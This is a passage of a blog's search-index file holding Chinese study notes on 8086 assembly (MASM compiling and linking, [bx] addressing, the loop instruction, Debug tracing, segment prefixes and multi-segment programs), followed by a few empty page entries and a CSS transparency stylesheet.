alt="image-20231227173239069"></p><p>6.交叉引用文件的生成</p><p>不输入输出地址即为不生成</p><p>7.编译结束</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227173436707.png" alt="image-20231227173436707"></p><h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><p>1.2.步骤与上同理</p><p>3.输入link.exe</p><p>4.如果是obj文件输入文件名即可，非obj文件需要带上文件后缀</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227174601366.png" alt="image-20231227174601366"></p><p>5.因为已经确定了目标文件名为 1.bj，则程序默认要输出的可执行文件名为1.EXE，所以可以不必再另行指定文件名。直接按 Enter 键，编译程序将在当前的目录下，生成1.EXE文件。</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227174757293.png" alt="image-20231227174757293"></p><p>6.忽略映像文件生成，直接【enter】</p><p>7.库文件连接，忽略直接【enter】</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227175112103.png" alt="image-20231227175112103"></p><p>警告为：没有栈段（后文再叙）</p><p>连接的作用：</p><p>(1)当<strong>源程序很大</strong>时，可以将它<strong>分为多个源程序文件</strong>来编译，<strong>每个源程序编译成为目标文件后</strong>，<strong>再用连接程序将它们连接到一起，生成一个可执行文件</strong>;<br>(2)&#x3D;&#x3D;<strong>程序中调用了某个库文件中的子程序，需要将这个库文件和该程序生成的目标文件连接到一起，生成一个可执行文件;</strong>&#x3D;&#x3D;<br>(3)一个源程序编译后，得到了存有机器码的目标文件，目标文件中的有些内容还不能直接用来生成可执行文件，连接程序将这些内容处理为最终的可执行信息。所以，<strong>在&#x3D;&#x3D;只有一个源程序文件&#x3D;&#x3D;，而&#x3D;&#x3D;又不需要调用某个库中的子程序&#x3D;&#x3D;的情况下，也&#x3D;&#x3D;必须用&#x3D;&#x3D;连接程序对目标文件进行处理，生成可执行文件。</strong><br>注意，对于连接的过程，<strong>可执行文件是我们要得到的最终结果。</strong></p><h4 id="以简化的方式进行编译和连接"><a href="#以简化的方式进行编译和连接" class="headerlink" title="以简化的方式进行编译和连接"></a>以简化的方式进行编译和连接</h4><p>简化编译<strong>C:\&gt;masm c:\1;</strong></p><p>简化连接<strong>C:\&gt;link 1;</strong></p><p><strong>&#x3D;&#x3D;自动忽略中间文件的生成&#x3D;&#x3D;</strong></p><h4 id="1-exe的执行"><a href="#1-exe的执行" class="headerlink" title="1.exe的执行"></a>1.exe的执行</h4><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227183159432.png" alt="image-20231227183159432"></p><h4 id="程序执行过程的追踪"><a href="#程序执行过程的追踪" class="headerlink" title="程序执行过程的追踪"></a>程序执行过程的追踪</h4><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227193505217.png" alt="image-20231227193505217"></p><h2 id="第五章-BX-和-loop-指令"><a href="#第五章-BX-和-loop-指令" class="headerlink" title="第五章[BX]和 loop 指令"></a>第五章[BX]和 loop 指令</h2><p><strong>1.[bx]和内存单元的描述</strong></p><p>要完整地描述一个内存单元，需要<strong>两种信息</strong>:&#x3D;&#x3D;<strong>1内存单元的地址</strong>&#x3D;&#x3D;;&#x3D;&#x3D;<strong>2内存单元的长度</strong>&#x3D;&#x3D;</p><p>mov ax，[bx]<br>&#x3D;&#x3D;<strong>将一个内存单元的内容送入 ax</strong>&#x3D;&#x3D;<strong>，这个内存单元的长度为 2 字节(字单元)，存放一个字，</strong>&#x3D;&#x3D;<strong>偏移地址在 bx中</strong>&#x3D;&#x3D;，&#x3D;&#x3D;段地址在 ds 中&#x3D;&#x3D;。</p><p><strong>2.我们定的描述性的符号:“()”</strong></p><p>(ax)表示ax中的内容、(al)表示al中的内容</p><p>(20000H)表示内存 20000H 单元的内容（()中的内存单元的地址为物理地址）;</p><p>((ds)*16+(bx))表示:<strong>ds 中的内容为ADR1</strong>，<strong>bx中的内容为 ADR2</strong>，<strong>内存ADR1*16+ADR2单元的内容</strong></p><p>也可以理解为:<strong>ds 中的 ADR1 作为段地址</strong>，<strong>bx 中的 ADR2作为偏移地址</strong>，<strong>内存ADR1:ADR2单元的内容。</strong></p><p>注意，“( )”中的元素可以有 <strong>3 种类型</strong>:&#x3D;&#x3D;<strong>1.寄存器名</strong>&#x3D;&#x3D;;&#x3D;&#x3D;<strong>2.段寄存器名</strong>&#x3D;&#x3D;:&#x3D;&#x3D;<strong>3.内存单元的物理地址</strong>&#x3D;&#x3D;(一个 20位数据)。比如:<br>**(ax)、(ds)、(al)、 (cx)、(20000H)、((ds)*16+(bx))<strong>等是</strong>正确**的用法;</p><p><strong>(2000:0)、((ds):1000H)<strong>等是</strong>不正确</strong>的用法。</p><p>我们看一下(X)的应用，比如，<br>(1)ax中的内容为0010H，可以这样来描述：(ax)&#x3D;0010H;</p><p>(2) 2000:1000 处的内容为 0010H，可以这样来描述：(21000H)&#x3D;0010H;</p><p>(3)对于mov ax,[2]的功能，可以这样来描述：(ax)&#x3D;((ds)<em>16+2);</em></p><p>(4)对于 mov  [2],ax的功能，可以这样来描述：((ds)*16+2)&#x3D;(ax);</p><p>(5)对于add ax,2的功能，可以这样来描述：(ax)&#x3D;(ax)+2;</p><p>(6)对于add ax,bx的功能，可以这样来描述：(ax)&#x3D;(ax)+(bx);</p><p>(7)对于 push ax的功能，可以这样来描述：(sp)&#x3D;(sp)-2((ss)*16+(sp))&#x3D;(ax)</p><p>(8)对于 pop ax的功能，可以这样来描述：(ax)&#x3D;((ss)*16+(sp))(sp)&#x3D;(sp)+2</p><p><strong>“(X)”</strong>所表示的数据有两种类型:<strong>1.字节</strong>;<strong>2.字</strong>。</p><p>(al)、(bI)、(cl)等得到的数据为字节型;</p><p>(ds)、(ax)、(bx)等得到的数据为字型;</p><p>(al)&#x3D;(20000H)，则(20000H)得到的数据为字节型;</p><p>(ax)&#x3D;(20000H)，则(20000H)得到的数据为字型。</p><p><strong>3.约定符号idata 表示常量</strong></p><h4 id="5-1-BX"><a href="#5-1-BX" class="headerlink" title="5.1[BX]"></a>5.1[BX]</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inc bx</span><br></pre></td></tr></table></figure><p>含义：bx中的内容加1。</p><h4 id="5-2loop指令"><a href="#5-2loop指令" class="headerlink" title="5.2loop指令"></a>5.2loop指令</h4><p>格式</p><p>(1)在 &#x3D;&#x3D;<strong>cx 中存放循环次数</strong>&#x3D;&#x3D;</p><p>(2)<strong>&#x3D;&#x3D;loop  指令中的标号所标识地址要在前面&#x3D;&#x3D;</strong></p><p>(3)<strong>&#x3D;&#x3D;要循环执行的程序段，要写在标号和 loop 指令的中间&#x3D;&#x3D;</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov cx,循环次数</span><br><span class="line">s:</span><br><span class="line">循环执行的程序段</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure><p>例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax，2</span><br><span class="line"></span><br><span class="line">mov cx,11</span><br><span class="line">s:add ax,axs:</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax，4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>(1) 标号**&#x3D;&#x3D;s&#x3D;&#x3D;**<br>    在汇编语言中，标号代表一个地址，程序中有一个标号 <strong>&#x3D;&#x3D;s&#x3D;&#x3D;<strong>。它实际上标识了一个地址，这个地址处有一条指令:</strong>&#x3D;&#x3D;add ax,ax&#x3D;&#x3D;<strong>。<br>(2) loop s<br>CPU执行 loops的时候，要进行</strong>两步操作</strong>:<br>&#x3D;&#x3D;<strong>1.(cx)&#x3D;(cx)-1;</strong>&#x3D;&#x3D;<br><strong>&#x3D;&#x3D;2.判断 cx中的值，不为 0则转至标号s所的地址处执行(这里的指是 add ax,ax)如果为零则执行下一条指令(下一条指令是mov ax,4c00h)。&#x3D;&#x3D;</strong><br>(3) 以下3条指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov cx，11</span><br><span class="line">s:add ax,ax</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure><p>执行 <strong>loop s</strong> 时，<strong>首先要将(cx)减 1，然后若(cx)不为0，则向前转至 s 处执行add ax,ax</strong>。所以，<strong>可以利用cx来控制add ax,ax 的执行次数。</strong></p><h4 id="5-3-在Debug-中跟踪用-loop-指令实现的循环程序"><a href="#5-3-在Debug-中跟踪用-loop-指令实现的循环程序" class="headerlink" title="5.3 在Debug 中跟踪用 loop 指令实现的循环程序"></a>5.3 在Debug 中跟踪用 loop 指令实现的循环程序</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0ffffh//在汇编源程序中，数据不能以字母开头</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx，6</span><br><span class="line"></span><br><span class="line">mov al，[bx]</span><br><span class="line">mov ah,0</span><br><span class="line">mov dx,0</span><br><span class="line"></span><br><span class="line">mov cx，3</span><br><span class="line">s: add dx,ax//第12行</span><br><span class="line">loops</span><br><span class="line">mov ax，4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>循环程序段从CS:0012开始，我们不想再一步步地跟踪CS:0012前面的指令，从 CS:0012 处开始跟踪。**&#x3D;&#x3D;可以这样来使用g 命令，“g 0012”&#x3D;&#x3D;**</p><p>当然，也可以用g命令来达到目的，<strong>可以用“g 0016”直接执行到 CS:0016 处</strong></p><p>我们希望将循环一次执行完。可以使用 p 命令来达到目的。再次遇到loop 指令时，<strong>使用p命令来执行</strong>，Debug 就会自动重复执行循环中的指令，直到(cx)&#x3D;0为止。</p><h4 id="5-4-Debug-和汇编编译器-masm-对指令的不同处理"><a href="#5-4-Debug-和汇编编译器-masm-对指令的不同处理" class="headerlink" title="5.4 Debug 和汇编编译器 masm 对指令的不同处理"></a>5.4 Debug 和汇编编译器 masm 对指令的不同处理</h4><p>“mov al,[0]”，含义:(al)&#x3D;0，将常量0送入al中(与mov al,0含义相同)</p><p>“mov al,ds:[0]”，含义:(al)&#x3D;((ds)*16+0)，将内存单元中的数据送入al中;</p><p>“mov al,[bx]”，含义:(al)&#x3D;((ds)*16+(bx))，将内存单元中的数据送入al中</p><p>“mov al,ds:[bx]”，含义:与“mov al,[bx]”相同。</p><p>从上面的比较中可以看出:<br>(1)在汇编源程序中，如果用指令访问一个内存单元，则在指令中必须用“[…]”来表示内存单元，如果在“[]”里用一个常量 idata 直接给出内存单元的偏移地址，就要<strong>在“[]”的前面</strong>显式地<strong>给出段地址所在的段寄存器。</strong>比如<br><strong>mov al,ds:[0]</strong><br>如果<strong>没有在“[]”的前面</strong>显式地<strong>给出段地址所在的段寄存器</strong>，比如<br><strong>mov al,[0]</strong><br>那么，<strong>编译器masm将把指令中的“[idata]”解释为“idata”</strong><br>(2) 如果在“[]”里用寄存器，<strong>比如 bx，间接给出内存单元的偏移地址</strong>，<strong>则段地址默认在 ds 中</strong>。当然，<strong>也可以显式地给出段地址所在的段寄存器。</strong></p><h4 id="5-5-loop-和-bx-的联合应用"><a href="#5-5-loop-和-bx-的联合应用" class="headerlink" title="5.5 loop 和[bx]的联合应用"></a>5.5 loop 和[bx]的联合应用</h4><p>计算ffff:0~ffff:b单元中的数据的和，结果存储在dx中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,Offffh</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx，0;初始化ds:bx指向 ffff:0</span><br><span class="line"></span><br><span class="line">mov dx，0;初始化累加寄存器dx，(dx)=0</span><br><span class="line">mov cx，12;初始化循环计数寄存器 cx，(cx)=12</span><br><span class="line"></span><br><span class="line">s:mov al，[bx]</span><br><span class="line">mov ah，0</span><br><span class="line">add dx,ax ;间接向 dx中加上((ds)*16+(bx))单元的数值</span><br><span class="line">inc bx ;ds:bx 指向下一个单元</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax，4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>8位字节型数累加结果存入16位字型dx中</p><p>1.将8位字节型数据存入中间暂存16位字型ax中，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al，[bx]</span><br><span class="line">mov ah，0</span><br></pre></td></tr></table></figure><p>2.将16位ax中的数据转入到dx中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add dx,ax</span><br></pre></td></tr></table></figure><p>3.设计循环，可把bx（bx已经初始化为0）当作为中间变量，在循环的末尾加上一句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inc bx</span><br></pre></td></tr></table></figure><h4 id="5-6段前缀"><a href="#5-6段前缀" class="headerlink" title="5.6段前缀"></a>5.6段前缀</h4><p>用于显式地指明内存单元的段地址的“ds:” “cs:” “ss:” “es:”在汇编语言中称为段前缀</p><p>例如<strong>mov ax,ds:[bx]</strong> 中的ds:</p><h4 id="5-7-一段安全的空间"><a href="#5-7-一段安全的空间" class="headerlink" title="5.7 一段安全的空间"></a>5.7 一段安全的空间</h4><p>(1)我们需要直接向一段内存中写入内容:</p><p>(2)这段内存空间不应存放系统或其他程序的数据或代码，否则写入操作很可能引发错误;</p><p>(3) DOS 方式下，一般情况，0:20~0:2ff 空间中没有系统或其他程序的数据或代码;(可以先用debug检查一下)</p><p>(4)以后，我们需要直接向一段内存中写入内容时，就使用 0:200~0:2ff这空间</p><h4 id="5-8段前缀的使用"><a href="#5-8段前缀的使用" class="headerlink" title="5.8段前缀的使用"></a>5.8段前缀的使用</h4><p>将内存ffff:0<del>ffff:b单元中的数据复制到0:200</del>0:20b 单元中</p><p>0:200<del>0:20b→0020:0</del>0020:b</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">mov ax,0ffffh</span><br><span class="line">mov ds,ax;用 ds 存放源始空间ffff:0~ffff:b 的段地址。</span><br><span class="line"></span><br><span class="line">mov ax,0020h</span><br><span class="line">mov es,ax;用es 存放标空间 0020:00020:b 的段地址</span><br><span class="line"></span><br><span class="line">mov cx,12</span><br><span class="line">mov bx,0</span><br><span class="line"></span><br><span class="line">s:mov dl,[bx]</span><br><span class="line">mov es:[bx],dl;显式地用段前缀“es:”给出单元的段地址，这样就不必在循环中重复设置 ds。</span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h2 id="第6章包含多个段的程序"><a href="#第6章包含多个段的程序" class="headerlink" title="第6章包含多个段的程序"></a>第6章包含多个段的程序</h2><h4 id="6-1在代码段中使用数据"><a href="#6-1在代码段中使用数据" class="headerlink" title="6.1在代码段中使用数据"></a>6.1在代码段中使用数据</h4><p>我们若要 CPU从何处开始执行程序，<strong>只要在源程序中用“end 标号”指明就可以了。</strong><br>有了这种方法，就可以这样来安排程序的框架:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">:</span><br><span class="line">:</span><br><span class="line">数据</span><br><span class="line">:</span><br><span class="line">:</span><br><span class="line">start:</span><br><span class="line">:</span><br><span class="line">:</span><br><span class="line">代码</span><br><span class="line">:</span><br><span class="line">:</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>考虑这样一个问题，编程计算以下8个数据的和，结果存在ax寄存器中:</p><p>0123h、0456h、0789h、0abch、0defh、0fedh、0cbah、0987h</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,Odefh,0fedh,0cbah,0987h</span><br><span class="line">start:mov bx,0</span><br><span class="line">mov ax，0</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:add ax,cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax，4c00h</span><br><span class="line">int 21h</span><br><span class="line"></span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>​程序中的“dw”的含义是<strong>定义字型数据</strong>。**dw 即“defineword’’**在这里，使用 dw 定义了 8 个字型数据(数据之间以号分隔)，它们所占的内存空间的大小为16个字节。</p><h4 id="6-2在代码段中使用栈"><a href="#6-2在代码段中使用栈" class="headerlink" title="6.2在代码段中使用栈"></a>6.2在代码段中使用栈</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line">codesg segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,Ofedh,0cbah,0987h</span><br><span class="line">dw 0,0,0,0,0.0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">;用dw定义16个字型数据，在程序加载后，将取得16个字的</span><br><span class="line">;内存空间，存放这16个数据。在后面的程序中将这段</span><br><span class="line">;空间当作栈来使用</span><br><span class="line"></span><br><span class="line">start:mov aX,CS</span><br><span class="line">mov ss，ax</span><br><span class="line">mov sp，30h;将设置栈顶ss:sp指cs:30</span><br><span class="line"></span><br><span class="line">mov bx，0</span><br><span class="line">mov cx，8</span><br><span class="line">s:push cs:[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s;以上将代码段0~15单元中的8个字型数据</span><br><span class="line">;依次入栈</span><br><span class="line"></span><br><span class="line">mov cX，8</span><br><span class="line">mov bx，0</span><br><span class="line">s0:pop cs:[bx]</span><br><span class="line">add bx，2</span><br><span class="line">loop s0;以上依次出栈8个字型数据到代码段0~15单元中</span><br><span class="line"></span><br><span class="line">mov ax，4c00h</span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start;指明程序的入口在start处</span><br></pre></td></tr></table></figure><p>监测点6.1</p><p>cs是代码段寄存器，所以改写程序中的数据就是改写cs:ip的数据所以要mov cs:[bx],ax</p><h4 id="6-3将数据、代码、栈放入不同的段"><a href="#6-3将数据、代码、栈放入不同的段" class="headerlink" title="6.3将数据、代码、栈放入不同的段"></a>6.3将数据、代码、栈放入不同的段</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">assume cs:code,ds:data,ss:stack</span><br><span class="line"></span><br><span class="line">data segment</span><br><span class="line">dw 0123h，0456h,0789h,0abch,Odefh,Ofedh,0cbah,0987h</span><br><span class="line">data ends</span><br><span class="line"></span><br><span class="line">stack segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">stack ends</span><br><span class="line"></span><br><span class="line">code segment</span><br><span class="line">start:mov ax,stack</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,20h;设置栈顶ss:sp指向 stack:20</span><br><span class="line"></span><br><span class="line">mov ax,data</span><br><span class="line">mov ds,ax;ds指向data段</span><br><span class="line"></span><br><span class="line">mov bx,0;ds:bx指向 data段中的第一个单元</span><br><span class="line"></span><br><span class="line">mov cx,8</span><br><span class="line">s:push [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s;以上将data段中的0~15单元中的8个字型数据依次入栈</span><br><span class="line"></span><br><span class="line">mov bx，0</span><br><span class="line"></span><br><span class="line">mov cx，8</span><br><span class="line">s0:pop [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s0;以上依次出栈8个字型数据到data段的0~15单元中</span><br><span class="line"></span><br><span class="line">mov ax，4c00h</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>(1)定义多个段的方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assume 寄存器名:[name]</span><br><span class="line">[name] segment</span><br><span class="line">数据内容</span><br><span class="line">[name] ends</span><br></pre></td></tr></table></figure><p>(2)对段地址的引用</p><p>要把data:6送入bx中</p><p><strong>要用</strong>下面代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,data</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,ds:[6]</span><br></pre></td></tr></table></figure><p>我们<strong>不能</strong>用下面的指令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov ds,data</span><br><span class="line">mov bx,ds:[6]</span><br></pre></td></tr></table></figure><p>(3)“代码段”数据段”“栈段”完全是我们的安排</p><p>CPU 到底如何处理我们定义的段中的内容，是当作指令执行，当作数据访问，还是当作栈空间，完全是靠程序中具体的汇编指令，和汇编指令对 CS:IP、SS:SP、DS 等寄存器的设置来决定的。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>navigate</title>
      <link href="/navigate/index.html"/>
      <url>/navigate/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/transpancy.css"/>
      <url>/css/transpancy.css</url>
      
        <content type="html"><![CDATA[/* 文章页背景 */.layout_post>#post {    /* 以下代表透明度为0.7 可以自行修改*/    background: rgba(255, 255, 255, .7);}/* 所有页面背景 */#aside_content .card-widget,#recent-posts>.recent-post-item,.layout_page>div:first-child:not(.recent-posts),.layout_post>#page,.layout_post>#post,.read-mode .layout_post>#post {    /* 以下代表透明度为0.7 */    background: rgba(255, 255, 255, .7);}/*侧边卡片的透明度 */:root {    --card-bg: rgba(255, 255, 255, .7);}/* 页脚透明 */#footer {    /* 以下代表透明度为0.7 */    background: rgba(255, 255, 255, .0);}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>link</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
